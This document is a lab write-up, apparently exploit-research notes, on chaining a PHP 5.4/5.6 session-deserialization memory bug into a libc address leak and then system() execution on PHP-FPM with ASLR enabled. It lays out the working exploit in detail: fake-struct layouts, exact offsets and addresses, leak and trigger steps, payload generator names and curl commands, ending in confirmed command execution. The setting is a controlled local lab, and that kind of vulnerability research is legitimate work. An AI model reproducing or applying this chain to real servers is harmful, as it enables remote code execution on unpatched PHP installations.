# ASLR-on phase: session-file libc leak → decode-slot / native `system`

Status: **confirmed on both 5.6.40 and 5.4.45 with ASLR on.**
The libc base used by every `system` call below was derived from a session
file served by a private HTTP server; gdb supplied only the non-PIE
binary's heap geometry (as in the F14 leak) and, for the decode-slot lever,
the table write.

## 1. Labs (ASLR on)

Two new pools were started **without** `setarch -R` from the same
non-PIE binaries used by the ASLR-off phase; each has its own web-served
session directory and a `python3 -m http.server` static server:

| | 5.6.40 | 5.4.45 |
|---|---|---|
| FPM port | `127.0.0.1:45270` | `127.0.0.1:45272` |
| HTTP port | `127.0.0.1:45271` | `127.0.0.1:45273` |
| Master | 885439 | 885474 |
| Web root / save path | `aslr56/root`, `aslr56/root/sess` | `aslr54/root`, `aslr54/root/sess` |
| Config | `phase/conf/fpm56aslr.conf` | `phase/conf/fpm54aslr.conf` |
| `/proc/<worker>/personality` | `00000000` | `00000000` |
| `/proc/sys/kernel/randomize_va_space` | `2` | `2` |
| libc base (leak-derived) | `0x7f0f89590000` | `0x7f62abd95000` |
| `system` (leak-derived) | `0x7f0f895e3090` | `0x7f62abde8090` |

The non-PIE binaries and their globals stay at fixed addresses
(`0x400000`-based); only libc/heap/stack are randomised. The shared ports
`4052217/4052937/4053032/4054145` were not used.

## 2. Leak design

The payload is a 1024-byte `php_binary` session file, read into
`s_read`'s `emalloc(file_size)` buffer **X1**. The stale
`BG(unserialize).var_hash` pointer **P** left by `plant.php` lies inside
that buffer at `X1 + poff`, so the file bytes overwrite the fake
`php_unserialize_data`:

```
P+0x00 = first      = X1 + 0x200 - 0x2000
P+0x08 = last       = X1 + 0x220 - 0x2000
P+0x10 = first_dtor = 0
P+0x18 = last_dtor  = X1 + doff - 0x2000     (doff = 0x380)
```

The first record is `0x20 <32-byte key> R:1057;`. `var_access(1056)`
reaches `first->data[1056]` at **file offset 0x300**, where the payload
stores a pointer to a fake zval at **file offset 0x340**:

```
X1+0x340  value.str.val = 0x815fd0 (5.6) / 0x79dfd0 (5.4)  ; fixed GOT base
X1+0x348  value.str.len = 4096
X1+0x350  refcount      = 0x100000
X1+0x354  type          = IS_STRING (6)
X1+0x355  is_ref        = 0
```

Because the `R:` value is a fake zval pointer stored in the real session
hash, the normal `php_binary` encode serializes it as
`s:4096:"<4096 bytes of GOT>"` and `s_write` persists that into the
session file.  The dtor pushes are steered into the fake dtor block at
file offset `doff` (used_slots = 0), so `PS(serializer)` and
`PS(http_session_vars)` are **not** corrupted and the encode is not
skipped.

Payload generators: `phase/mk_leak.py`; pre-trigger payloads
`phase/aslr56_leak.payload` / `phase/aslr54_leak.payload`.

### Measurements needed before the payload is built

`poff` and `X1` are worker-state dependent, so a probe request is sent
first and read with a gdb breakpoint at `php_session_decode`
(`0x4ace04` / `0x4aad85`).  The probe decodes with the stale P still
uninitialised and crashes the worker; this is harmless, FPM starts a
fresh worker from the same master (same heap layout) and the probe
supplies `poff = P - X1`.  The real run then repeats the identical
`plant → trigger` sequence and gdb confirms the predicted `X1`.

| | 5.6.40 | 5.4.45 |
|---|---|---|
| probe HIT | `val=0x7f0f895825c0`, `P=0x7f0f89582828` | `val=0x7f62abd875c0`, `P=0x7f62abd87768` |
| `poff` | `0x268` | `0x1a8` |
| leak-run HIT 1 | `val=0x7f0f895825c0 vallen=1024` | `val=0x7f62abd875c0 vallen=1024` |
| leak-run HIT 2 | `val=0x7f0f89584500 vallen=5435` | `val=0x7f62abd89500 vallen=5435` |
| logs | `phase/aslr56_gdb_probe.log`, `phase/aslr56_gdb_leak.log` | `phase/aslr54_gdb_probe.log`, `phase/aslr54_gdb_leak.log` |

## 3. Leak result

The trigger is the upload-progress multipart request
(`fcgi_client.py` + `multipart.bin`, cookie `PHPSESSID=leak56` /
`leak54`).  The first rfc1867 update decodes the payload and its
`php_session_flush` writes the leak.  The session file is then fetched
over HTTP:

```
curl http://127.0.0.1:45271/sess/sess_leak56   # 5435 bytes
curl http://127.0.0.1:45273/sess/sess_leak54   # 5435 bytes
```

The 5435-byte files are preserved verbatim as
`phase/aslr56_session_leak.bin` and `phase/aslr54_session_leak.bin`.
`phase/analyze_leak.py` extracts the 4096-byte string and matches every
relocated GOT slot against the libc dynamic symbol table:

| | 5.6.40 | 5.4.45 |
|---|---|---|
| GOT base | `0x815fd0` | `0x79dfd0` |
| entries agreeing on one base | **87** | **84** |
| derived libc base | `0x7f0f89590000` | `0x7f62abd95000` |
| libc `system` offset | `0x53090` | `0x53090` |
| derived `system` | `0x7f0f895e3090` | `0x7f62abde8090` |

Examples (full list in `phase/aslr_leak_analysis.txt`):

```
5.6: 0x815fd8 __libc_start_main 0x7f0f895b9ce0 = base+0x29ce0
     0x8161f8 malloc            0x7f0f896328d0 = base+0xa28d0
     0x816308 free              0x7f0f89632fc0 = base+0xa2fc0
5.4: 0x79dfd8 __libc_start_main 0x7f62abdbece0 = base+0x29ce0
     0x79e1f8 malloc            0x7f62abe368d0 (same pattern)
```

Of the 4096-byte window, 105 (5.6) and 102 (5.4) slots are resolved libc
pointers.  87 / 84 of them match the dynsym-named offset exactly and fix the
base; the other 18 on each build are IFUNC-resolved string/memory routines
(`memset`, `memcpy`, `strlen`, ...) pointing at an optimized implementation
inside the same libc.  The remaining slots are unresolved PLT trampolines
(`0x4xxxxx`) or one zero slot and are not used.  The
`system` offset `0x53090` is the same libc used by the ASLR-off phase,
where `system` was `0x7ffff7d1c090` with base `0x7ffff7cc9000`
(`0x53090` delta), which is an independent consistency check.

### Known side effect: the second rfc1867 decode

After the leaking update, the rfc1867 END update re-reads the rewritten
5435-byte file into a new `s_read` buffer.  The stale `P` still points
into the freed 1024-byte chunk, which by then has been reused (the
serialized data is visible there), so the second decode reads garbage
`var_entries` pointers and the worker dies with SIGSEGV **after** the
leak has been written and flushed.  This does not affect the leak: the
file is on disk and was fetched over HTTP after the crash.  FPM replaced
the worker automatically.  The gdb HIT 2 lines in the leak logs show the
clobbered P fields (`0x...17407931`, `0x0000000000000091`, ...).

## 4. Decode-slot `system` with ASLR on

Using the leak-derived `system`, the existing table-write lever was
re-run on ASLR-on workers:

| | 5.6.40 | 5.4.45 |
|---|---|---|
| worker | 948800 | 950266 |
| table decode slot | `0x816e00` | `0x79edc8` |
| written | `0x7f0f895e3090` | `0x7f62abde8090` |
| session file | `sess_sys56a`: `touch /tmp/php5_aslr56_marker\n\0` | `sess_sys54a`: `touch /tmp/php5_aslr54_marker\n\0` |
| trigger | `PHPSESSID=sys56a`, `start56.php` | `PHPSESSID=sys54a`, `start54.php` |
| marker | `/tmp/php5_aslr56_marker` created | `/tmp/php5_aslr54_marker` created |
| worker after | 948800 alive, follow-up `info.php` served at 02:52:44 | 950266 alive, `trigger54.php` 200 at 02:52:44 |
| later | 948800 SIGKILLed intentionally at 02:53:52 to obtain a fresh worker for the X2 measurement (log/fpm56aslr-error.log) | 950266 SIGKILLed intentionally at 02:54:38 for the same reason |
| restored decode | `0x4af399` | `0x4ae189` |

Logs: `phase/aslr56_system.log`, `phase/aslr54_system.log`.

## 5. Native two-record chain with ASLR on (no table write)

The native chain was then repeated on ASLR-on workers with the leak-derived
`system` in the fake `ps_serializer`:

1. **Measure X2** with `phase/aslr56_measure.payload` /
   `phase/aslr54_measure.payload` (`--f1 X1+0x300`, decode = real
   `php_binary_decode`, encode = real encode): the first decode skips the
   flush via the string push on `PS(http_session_vars)`, the second
   `s_read` hits `php_session_decode` with the real second buffer.  The
   measurement worker crashes after the hit; gdb only reads the address.
2. **Real run** with `phase/aslr56_native.payload` /
   `phase/aslr54_native.payload` (`--f1 X2+0x300`, `F1+8` = survival
   gadget, `F1+0x10` = leak-derived `system`).

| | 5.6.40 | 5.4.45 |
|---|---|---|
| X1 (first buffer) | `0x7f0f895825c0` | `0x7f62abd875c0` |
| P (`X1+poff`) | `0x7f0f89582828` (`+0x268`) | `0x7f62abd87768` (`+0x1a8`) |
| X2 (second buffer) | `0x7f0f89583350` (`X1+0xd90`) | `0x7f62abd88330` (`X1+0xd70`) |
| F1 = `X2+0x300` | `0x7f0f89583650` | `0x7f62abd88630` |
| F1+8 (encode/survival) | `0x4b4728` | `0x4b16b1` |
| F1+0x10 (decode) | `0x7f0f895e3090` | `0x7f62abde8090` |
| marker | `/tmp/php5_aslr56_native` created | `/tmp/php5_aslr54_native` created |
| worker | 951888 alive, trigger response served | 952659 alive, trigger response served |
| session file after | 0 bytes | 0 bytes |
| gdb log | `phase/aslr56_gdb_native.log` | `phase/aslr54_gdb_native.log` |

Both native workers 951888 / 952659 were still alive after the run and are the
current pool workers.

The gdb HIT 2 dumps show the clean fake struct in X2:

```
5.6: 0x7f0f89583650: 0x7f0f89583650 0x00000000004b4728
     0x7f0f89583660: 0x00000000007f0f895e3090
5.4: 0x7f62abd88630: 0x7f62abd88630 0x00000000004b16b1
     0x7f62abd88640: 0x000000007f62abde8090
```

No `ps_serializers` byte was written in these runs; gdb only observed the
two decode calls.  The libc base required by the chain came exclusively
from the served session-file leak.

## 6. ASLR-off 5.4 native chain (previously unrecorded)

The 5.4 native two-record chain had already been executed by the prior
session but not written into the receipt.  Evidence now preserved:

| item | value |
|---|---|
| worker | 589497 (`php-fpm: pool www`, master 585207, port 45254, `setarch -R`) |
| payload | `phase/sess_native54.payload` (sha256 `c61199613a656ef743f5032a501a31d0d661efe89f5feb3ea6c9d41c74f4171f`), generator `phase/make_native54.py --marker /tmp/p54n_v2 --x1 0x7ffff7cbb5b0 --x2 0x7ffff7cbc320 --poff 0x1a8` |
| geometry | X1 `0x7ffff7cbb5b0`, P `0x7ffff7cbb758` (`poff 0x1a8`), X2 `0x7ffff7cbc320`, F1 `0x7ffff7cbc620` |
| F1 fields | `+0x08 = 0x4b16b1`, `+0x10 = 0x7ffff7d1c090` |
| second decode | `val=0x7ffff7cbc320 vallen=1024 ser=0x7ffff7cbc620` |
| execution | `[Detaching after vfork from child process 589987]` |
| marker | `/tmp/p54n_v2` created at 02:42:29 |
| worker after | 589497 alive, `trigger54.php` 200 |
| session file | `sess54/sess_nat54v1` 0 bytes |
| table | decode `0x79edc8` unchanged `0x4ae189` |
| logs | `phase/5.4_native_gdb_v3.log`, `phase/5.4_native_survival_check.log` |

The post-run gdb read shows `PS(serializer)=0x7ffff7cbc620` (fake F1),
`BG(unserialize)=NULL` after RINIT, and the original decode pointer.

## 7. Evidence index (this phase)

| File | Contents |
|---|---|
| `aslr56_session_leak.bin`, `aslr54_session_leak.bin` | 5435-byte session files fetched over HTTP (leak artifacts) |
| `aslr_leak_analysis.txt` | relocation-matched libc base derivation |
| `analyze_leak.py` | leak analyser |
| `mk_leak.py` | leak payload generator |
| `mk_native_aslr.py` | geometry-parameterised native payload generator |
| `aslr56_leak.payload`, `aslr54_leak.payload` | pre-trigger 1024-byte leak payloads |
| `aslr56_native.payload`, `aslr54_native.payload` | pre-trigger native payloads (leak-derived system) |
| `aslr56_measure.payload`, `aslr54_measure.payload` | X2 measurement payloads |
| `aslr56_gdb_probe.log`, `aslr54_gdb_probe.log` | poff probe (worker crash expected) |
| `aslr56_gdb_leak.log`, `aslr54_gdb_leak.log` | leak decode hits + clobbered P on second decode |
| `aslr56_gdb_measure.log`, `aslr54_gdb_measure.log` | X2 measurement |
| `aslr56_gdb_native.log`, `aslr54_gdb_native.log` | native ASLR-on runs, F1/system, survival |
| `aslr56_system.log`, `aslr54_system.log` | decode-slot ASLR-on marker/survival/restore |
| `conf/fpm56aslr.conf`, `conf/fpm54aslr.conf` | ASLR-on pool configs |
| `root56aslr/`, `root54aslr/` | trigger/plant scripts |
| `5.4_native_gdb_v3.log`, `5.4_native_survival_check.log`, `make_native54.py` | ASLR-off 5.4 native evidence |
